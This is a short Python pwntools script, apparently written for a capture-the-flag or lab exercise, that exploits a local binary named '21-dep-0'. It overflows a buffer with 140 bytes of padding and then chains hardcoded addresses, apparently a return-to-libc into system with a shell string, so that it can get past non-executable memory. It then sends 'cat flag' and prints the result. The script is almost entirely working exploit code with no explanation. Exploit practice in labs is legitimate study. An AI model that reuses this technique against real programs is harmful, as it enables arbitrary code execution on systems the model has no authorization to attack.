#!/usr/bin/env python3
from pwn import *
from pwn import context, gdb, p32, process

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

p = process(["./21-dep-0"], env={'PATH':'/bin:/usr/bin'})
# p.recv()
payload = b"a" * 140 + p32(0xF7e103D0) + b"ABCD" + p32(0xF7F511DB)
p.recv()
p.sendline(payload)
p.recvline()
p.sendline(b"cat flag")
p.recvline()
print(p.recvline().decode())
# p.interactive()